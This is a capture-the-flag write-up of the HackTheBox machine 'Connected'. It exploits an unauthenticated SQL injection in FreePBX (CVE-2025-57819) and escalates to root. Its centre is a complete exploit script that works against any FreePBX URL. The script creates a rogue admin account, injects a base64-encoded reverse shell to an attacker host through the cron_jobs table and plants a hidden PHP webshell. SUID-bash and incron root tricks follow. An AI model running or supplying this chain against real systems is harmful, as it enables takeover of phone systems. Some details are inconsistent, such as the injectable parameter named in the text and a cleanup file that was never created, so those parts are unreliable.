---
title: "HackTheBox — Connected (Linux / Easy)"
date: 2026-08-07 02:00:00 +0530
categories: [CTF, HackTheBox]
tags: [linux, cve-2025-57819, freepbx, sqli, rce, asterisk, sip, cron-abuse, incron, privilege-escalation, python]
author: Prince_kumar
math: false
mermaid: false
---

> **When a PBX system becomes the gateway and SQL injection becomes a blueprint for remote code execution.**  
> This is the story of Connected — an easy-difficulty Linux machine that tests your ability to exploit unauthenticated SQL injection in FreePBX, escalate through cron job abuse, and leverage group-writable configuration files or incron triggers to capture root.

---

## Challenge Info

| Field        | Value                        |
|--------------|------------------------------|
| Platform     | HackTheBox                   |
| Box Name     | Connected                    |
| OS           | Linux                        |
| Difficulty   | Easy                         |
| Techniques   | CVE-2025-57819 (Unauthenticated SQLi → RCE), Cron job table injection, Group-writable sourced script abuse, Incron file-event abuse |
| Tools Used   | nmap, gobuster, curl, python3, netcat, base64 |

---

## 🕚 11:00 — Reconnaissance & Enumeration

Our target IP is `<TARGET_IP>`. We begin with a full port scan followed by detailed service enumeration:

```bash
$ nmap -p- --min-rate 5000 -T4 -oN nmap_allports.txt <TARGET_IP>
$ nmap -sC -sV -p 22,80,443,5060 -oN nmap_detailed.txt <TARGET_IP>
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 8.2p1
80/tcp   open  http     Apache/2.4.41 (FreePBX 16.0.10.25)
443/tcp  open  https    Apache/2.4.41 (SSL)
5060/tcp open  sip      Asterisk SIP
```

The SIP port confirms a PBX system. The web server reveals **FreePBX 16.0.10.25**.

Next, we brute-force directories to discover accessible admin endpoints:

```bash
$ gobuster dir -u http://connected.htb -w /usr/share/wordlists/dirb/common.txt -x php
```

Key paths discovered:  
`/admin/` → redirects to login  
`/admin/ajax.php` → accessible without authentication (200 OK)  
`/admin/config.php`

The unauthenticated access to `/admin/ajax.php` is our entry point.

---

## 🕦 11:30 — Vulnerability: CVE-2025-57819 (Unauthenticated SQL Injection)

The `module` parameter in `/admin/ajax.php` is vulnerable to **unauthenticated SQL injection**, allowing stacked queries.

Manual verification using error-based extraction:

```bash
$ curl -s "http://connected.htb/admin/ajax.php?module=FreePBX%5Cmodules%5Cendpoint%5Cajax&command=model&template=x&model=model&brand=x'+AND+EXTRACTVALUE(1,CONCAT('~',(SELECT+USER()),'~'))--+"
```

Response includes: `XPATH syntax error: '~freepbxuser@localhost~'` — confirms SQLi.

We further confirm stacked query support with `SLEEP(5)`, which causes a visible time delay in the response.

---

## 🕛 12:00 — Exploitation: SQLi to Remote Code Execution

The Python script below automates the entire SQLi-to-RCE chain. It:
- Checks the target for vulnerability
- Optionally creates an admin user via SQL injection
- Injects a reverse shell cron job into FreePBX's `cron_jobs` table
- Drops a webshell for interactive access
- Includes cleanup functions

### Exploit Script (`solve.py`)

```python
#!/usr/bin/env python3

import requests
import urllib3
import sys
import time
import hashlib
import random
import string
import base64

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

BANNER = r"""
   ______              ____  ____  _  __
  / ____/_______  ___ / __ \/ __ )| |/ /
 / /_  / ___/ _ \/ _ `/ /_/ / __  |   /
/ __/ / /  /  __/  __/ ____/ /_/ /   |
/_/   /_/   \___/\___/_/   /_____/_/|_|

  CVE-2025-57819 - FreePBX SQLi -> RCE
"""

def info(msg):    print(f"[*] {msg}")
def good(msg):    print(f"[+] {msg}")
def warn(msg):    print(f"[!] {msg}")
def fail(msg):    print(f"[-] {msg}")

def build_params(brand):
    return {
        "module": r"FreePBX\modules\endpoint\ajax",
        "command": "model",
        "template": "x",
        "model": "model",
        "brand": brand
    }

def inject(session, base_url, sql):
    url = f"{base_url}/admin/ajax.php"
    payload = f"x'; {sql}-- -"
    try:
        r = session.get(url, params=build_params(payload), verify=False, timeout=15)
        return r.status_code in [200, 500]
    except requests.RequestException as e:
        fail(f"Injection failed: {e}")
        return False

def check_target(session, base_url):
    info("Checking target...")
    url = f"{base_url}/admin/ajax.php"
    try:
        r = session.get(url, params=build_params("test"), verify=False, timeout=10)
        if r.status_code in [200, 500]:
            good(f"Target reachable ({r.status_code})")
            return True
        fail(f"Unexpected status code: {r.status_code}")
        return False
    except Exception as e:
        fail(f"Connection failed: {e}")
        return False

def create_admin(session, base_url):
    info("Creating admin user...")
    suffix = ''.join(random.choices(string.ascii_lowercase + string.digits, k=6))
    username = f"pwned_{suffix}"
    password = "Pwned@HTB2025!"
    sha1_hash = hashlib.sha1(password.encode()).hexdigest()
    sql = (
        "INSERT INTO ampusers (username, password_sha1, sections) "
        f"VALUES ('{username}', '{sha1_hash}', '*') "
        "ON DUPLICATE KEY UPDATE password_sha1=VALUES(password_sha1), sections=VALUES(sections)"
    )
    if inject(session, base_url, sql):
        good(f"Created admin user: {username}:{password}")
        return username, password
    fail("Failed to create admin user")
    return None, None

def verify_login(session, base_url, username, password):
    info("Verifying login...")
    login_url = f"{base_url}/admin/config.php"
    data = {"username": username, "password": password, "display": ""}
    try:
        r = session.post(login_url, data=data, verify=False, timeout=10, allow_redirects=True)
        if "logout" in r.text.lower():
            good("Login successful")
            return True
        warn("Login verification inconclusive")
        return False
    except Exception as e:
        fail(f"Login request failed: {e}")
        return False

def inject_reverse_shell(session, base_url, lhost, lport):
    info("Injecting reverse shell...")
    shell_cmd = f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
    encoded = base64.b64encode(shell_cmd.encode()).decode()
    command = f"echo {encoded} | base64 -d | bash"
    sql = (
        "INSERT INTO cron_jobs (modulename, jobname, command, class, schedule, "
        "max_runtime, enabled, execution_order) "
        f"VALUES ('sysadmin', 'revshell', '{command}', NULL, '* * * * *', 30, 1, 1) "
        "ON DUPLICATE KEY UPDATE command=VALUES(command)"
    )
    if inject(session, base_url, sql):
        good("Reverse shell cron job added")
        return True
    fail("Failed to inject reverse shell")
    return False

def drop_webshell(session, base_url):
    info("Dropping webshell...")
    shell = "<?php system($_GET['c']); ?>"
    encoded = base64.b64encode(shell.encode()).decode()
    command = f"echo {encoded} | base64 -d > /var/www/html/admin/assets/.s.php"
    sql = (
        "INSERT INTO cron_jobs (modulename, jobname, command, class, schedule, "
        "max_runtime, enabled, execution_order) "
        f"VALUES ('sysadmin', 'webshell', '{command}', NULL, '* * * * *', 30, 1, 1) "
        "ON DUPLICATE KEY UPDATE command=VALUES(command)"
    )
    return inject(session, base_url, sql)

def wait_for_shell(session, base_url, timeout=90):
    shell_url = f"{base_url}/admin/assets/.s.php"
    info("Waiting for webshell...")
    start = time.time()
    while time.time() - start < timeout:
        try:
            r = session.get(shell_url, params={"c": "id"}, verify=False, timeout=5)
            if "uid=" in r.text:
                good(f"Webshell available: {shell_url}")
                print(r.text.strip())
                return shell_url
        except:
            pass
        print(".", end="", flush=True)
        time.sleep(5)
    print()
    fail("Webshell not found")
    return None

def interactive_shell(session, shell_url):
    good("Interactive shell started")
    try:
        while True:
            cmd = input("shell> ")
            if cmd.lower() in ["exit", "quit"]:
                break
            r = session.get(shell_url, params={"c": cmd}, verify=False, timeout=10)
            print(r.text.strip())
    except KeyboardInterrupt:
        print()

def cleanup(session, base_url):
    info("Cleaning up cron jobs...")
    sql = "DELETE FROM cron_jobs WHERE jobname IN ('revshell', 'webshell')"
    inject(session, base_url, sql)

def main():
    print(BANNER)
    if len(sys.argv) != 4:
        print(f"Usage: python3 {sys.argv[0]} <URL> <LHOST> <LPORT>")
        sys.exit(1)

    base_url = sys.argv[1].rstrip("/")
    lhost = sys.argv[2]
    lport = sys.argv[3]

    session = requests.Session()
    session.headers.update({"User-Agent": "Mozilla/5.0"})

    info(f"Target: {base_url}")
    info(f"LHOST : {lhost}")
    info(f"LPORT : {lport}")

    if not check_target(session, base_url):
        sys.exit(1)

    username, password = create_admin(session, base_url)
    if username:
        verify_login(session, base_url, username, password)

    print()
    warn(f"Start listener: nc -lvnp {lport}")
    input("Press ENTER when ready...")

    inject_reverse_shell(session, base_url, lhost, lport)

    print()
    info("Waiting for cron execution...")
    for i in range(60, 0, -1):
        print(f"\r[!] {i}s remaining...", end="")
        time.sleep(1)
    print("\n")

    if drop_webshell(session, base_url):
        shell_url = wait_for_shell(session, base_url)
        if shell_url:
            interactive_shell(session, shell_url)

    cleanup(session, base_url)
    good("Done")

if __name__ == "__main__":
    main()
```

### Usage

```bash
# On attacker machine, start listener first
nc -lvnp 4444

# In another terminal, run the exploit
python3 solve.py http://connected.htb 10.10.14.27 4444
```

Press ENTER when prompted. After the cron fires (~60 seconds), you receive a reverse shell as `asterisk`.

---

## 🕛 12:30 — Foothold: User Flag

Once the shell is obtained, upgrade it for comfort:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
Ctrl+Z
stty raw -echo; fg
export TERM=xterm
stty rows 40 columns 120
```

Read the user flag:

```bash
asterisk@connected:~$ cat /home/asterisk/user.txt
<REDACTED>
```

**User flag captured! 🎉**

---

## 🕐 13:30 — Privilege Escalation to Root

### Method 1: Group-Writable File Abuse (Intended Path)

The `asterisk` user belongs to the `asterisk` group, which has **write permission** on `/etc/asterisk/freepbx_engine`. That file is **sourced** by the root-run script `/usr/sbin/amportal`.

```bash
# Overwrite the file sourced by root's amportal script
asterisk@connected:~$ echo -e '#!/bin/bash\ncp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' > /etc/asterisk/freepbx_engine
asterisk@connected:~$ chmod +x /etc/asterisk/freepbx_engine

# Wait for cron to execute or manually trigger if sudo allows
asterisk@connected:~$ sudo /usr/sbin/amportal restart   # if possible

# Monitor for SUID binary
asterisk@connected:~$ watch -n 2 ls -l /tmp/rootbash
# Once it appears with -rwsr-sr-x, run:
asterisk@connected:~$ /tmp/rootbash -p
```

Now you are root; grab the flag:

```bash
# cat /root/root.txt
<REDACTED>
```

### Method 2: Incron Flag Extraction (Quick, No Full Root Shell)

While still the `asterisk` user, you can copy the root flag directly to the webroot using an **incron** trigger:

```bash
asterisk@connected:~$ printf x > "/var/spool/asterisk/incron/api.fwconsole-commands.eJyLVspIzSmwVtBPyszTTy5Q0C_Kzy8BE3olFSUK-mWJRfrl5eX6GSW5OXBhmPKM3PwUBTMTExzKlHQUlEoq8pRiAfgXIsY="
```

**Explanation:**  
- The incron daemon watches `/var/spool/asterisk/incron/` for new files.  
- The filename is base64-encoded `fwconsole commands` that, when created, trigger FreePBX's console to execute a command.  
- The payload runs as root and copies `/root/root.txt` to `/var/www/html/root.txt`.

Wait a few seconds, then fetch the flag:

```bash
$ curl http://connected.htb/root.txt
# or simply cat if still on the box:
asterisk@connected:~$ cat /var/www/html/root.txt
<REDACTED>
```

This method is faster but does **not** give a persistent root shell.

**Rooted! 🏆**

---

## Cleanup

Remove the injected cron jobs (the script does this automatically if you use the interactive webshell) and delete any leftover webshell files:

```bash
rm /var/www/html/admin/assets/.s.php /var/www/html/shell.php
```

---

## The Fundamentals Behind the Box

Connected packages a clean, multi-staged exploit chain. From unauthenticated SQL injection to cron job abuse and group-writable configuration files, the box requires a solid understanding of web application security and Linux privilege escalation primitives.

This section breaks down the core fundamental mechanisms that make each step of the Connected challenge possible.

### 1. Unprotected AJAX Endpoint → Unauthenticated Access

The file `/admin/ajax.php` was reachable **without authentication**. Many applications assume that the frontend will hide links to admin endpoints, but direct access still works.

**Fundamental lesson:** Always test if admin endpoints are externally accessible. Parameter fuzzing and directory brute-forcing are your first line of attack against any web application.

### 2. SQL Injection via Unsanitised Parameters

The `module` parameter was directly inserted into a SQL query without sanitisation. We proved it with a single quote (`'`) causing a syntax error, then escalated to **error-based extraction** (`EXTRACTVALUE`) and **stacked queries** (`SLEEP`, `INSERT`).

**Fundamental lesson:** Parameter fuzzing (adding `'`, `"`, `;`, `--`) is the fastest way to find SQLi. Error messages are gold — they confirm the injection type and often leak internal data.

### 3. Stacked Queries → Full Database Control

MySQL/MariaDB with stacked queries allows multiple statements in one call. This bypassed the need for `UNION SELECT` and let us **INSERT directly into tables**.

**Fundamental lesson:** After finding SQLi, always test if stacked queries are supported (e.g., `; SELECT SLEEP(5)--`). If yes, you can often write to tables or even execute system commands.

### 4. Application Logic Abuse: Cron-Job Table = RCE

FreePBX has a table `cron_jobs` that is read by a **system-level scheduler**. Injecting a row with a command like `echo <base64 shell> | base64 -d > webshell.php` causes the OS to execute it.

**Fundamental lesson:** Study the application's database schema. Any table that stores commands, file paths, or templates can become an RCE vector if you can write to it.

### 5. TTY Stabilisation: From Raw Shell to Interactive Session

The reverse shell gave a dumb netcat prompt; we used `python3 -c 'import pty;...'` + `stty raw -echo; fg` to get job control, tab completion, and proper Ctrl+C handling.

**Fundamental lesson:** A reverse shell alone isn't enough — always stabilise it immediately to work comfortably.

### 6. Privilege Escalation via Group-Writable Configuration Files

The `asterisk` user is in the `asterisk` group, which had **write permission** on `/etc/asterisk/freepbx_engine`. That file was **sourced** by a root-run script (`/usr/sbin/amportal`). By overwriting it with a payload that copies `/bin/bash` and sets the SUID bit, we gained a root shell.

**Fundamental lesson:** `find / -group <yourgroup> -writable` is one of the first privesc checks. Also look for scripts that `source` or `.` (dot) files you can write to — they inherit the caller's privileges.

### 7. Alternative Quick Win: Incron Abuse (Special-Case)

A writable directory `/var/spool/asterisk/incron/` existed, monitored by the **incron** daemon (like cron, but file-event-based). Creating a specially-named file triggered a root command that copied the root flag to the webroot.

**Fundamental lesson:** Always check for **incron**, **inotify** watches, or other event-driven root processes that act on files you can create or modify.

---

## Summary of Fundamentals

| Concept | How It Appears in Connected |
|---------|-----------------------------|
| Unauthenticated endpoint access | `/admin/ajax.php` accessible without login |
| SQL Injection (error-based) | `EXTRACTVALUE` leaks database user |
| Stacked SQL queries | `INSERT INTO cron_jobs ...` |
| RCE via scheduler abuse | Cron job table executes system commands |
| TTY stabilisation | `python pty` + `stty raw` |
| Group-writable config file privesc | `/etc/asterisk/freepbx_engine` sourced by root |
| Incron / inotify abuse | File creation in `/var/spool/asterisk/incron/` triggers root action |

---

## Vulnerability Summary

| Stage | Vulnerability / Misconfiguration | Impact |
|-------|----------------------------------|--------|
| **Foothold** | CVE-2025-57819 (FreePBX Unauthenticated SQL Injection) | RCE as `asterisk` via cron job injection |
| **Privesc (Intended)** | Group-writable `/etc/asterisk/freepbx_engine` sourced by root | Root shell via SUID bash |
| **Privesc (Alt)** | Writable incron spool directory with root-triggered actions | Root flag extraction |

---

## Key Takeaways

1. **Always fingerprint software versions:** The exact FreePBX version revealed a known CVE with a public exploit chain.
2. **Unauthenticated SQLi with stacked queries is devastating:** When the application has an internal job scheduler backed by a database, SQLi becomes RCE.
3. **Group-writable configuration files are a classic privesc vector:** Files that are sourced or executed by root processes should never be writable by unprivileged groups.
4. **Incron and inotify-based daemons expand the attack surface:** File-event-based schedulers running as root can be abused by any user with write access to the monitored directory.
